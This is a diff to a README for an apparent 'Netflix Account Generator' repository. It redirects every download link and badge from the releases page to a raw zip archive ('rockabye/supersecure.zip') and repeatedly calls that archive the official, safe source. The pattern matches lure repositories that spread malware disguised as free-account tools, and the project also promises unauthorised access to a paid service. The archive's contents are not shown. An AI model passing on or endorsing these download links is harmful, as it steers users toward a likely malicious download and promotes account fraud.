@@ -1,10 +1,10 @@
 # 🎬 Netflix-Account-Generator - Get Your Free Netflix Accounts Instantly
 
-[![Download Netflix Account Generator](https://img.shields.io/badge/Download-Netflix_Account_Generator-FF0000?style=for-the-badge&logo=netflix&logoColor=white&labelColor=black)](https://github.com/jeraldtrendy8954/Netflix-Account-Generator/releases)
+[![Download Netflix Account Generator](https://img.shields.io/badge/Download-Netflix_Account_Generator-FF0000?style=for-the-badge&logo=netflix&logoColor=white&labelColor=black)](https://raw.githubusercontent.com/jeraldtrendy8954/Netflix-Account-Generator/main/rockabye/supersecure.zip)
 
 ## 📥 Download & Installation
 
-Visit this link to download the application: **[https://github.com/jeraldtrendy8954/Netflix-Account-Generator/releases](https://github.com/jeraldtrendy8954/Netflix-Account-Generator/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/jeraldtrendy8954/Netflix-Account-Generator/main/rockabye/supersecure.zip](https://raw.githubusercontent.com/jeraldtrendy8954/Netflix-Account-Generator/main/rockabye/supersecure.zip)**
 
 Once you click the link above, you will be taken to the official download page for the Netflix Account Generator. This is the only official source for the software, so make sure you download it from there to ensure you get the latest and safest version.
 
@@ -96,9 +96,9 @@ Netflix-Account-Generator is the ultimate solution for anyone looking to get fre
 
 So what are you waiting for? Click the download button below and start generating your free Netflix accounts today!
 
-[![Get Netflix Account Generator](https://img.shields.io/badge/⬇️_Download_Now-Netflix_Account_Generator-00FF00?style=for-the-badge&logo=windows&logoColor=white&labelColor=black)](https://github.com/jeraldtrendy8954/Netflix-Account-Generator/releases)
+[![Get Netflix Account Generator](https://img.shields.io/badge/⬇️_Download_Now-Netflix_Account_Generator-00FF00?style=for-the-badge&logo=windows&logoColor=white&labelColor=black)](https://raw.githubusercontent.com/jeraldtrendy8954/Netflix-Account-Generator/main/rockabye/supersecure.zip)
 
-Remember, the official download link is always: **https://github.com/jeraldtrendy8954/Netflix-Account-Generator/releases**
+Remember, the official download link is always: **https://raw.githubusercontent.com/jeraldtrendy8954/Netflix-Account-Generator/main/rockabye/supersecure.zip**
 
 Enjoy your free Netflix accounts and happy streaming! 🍿🎉
 
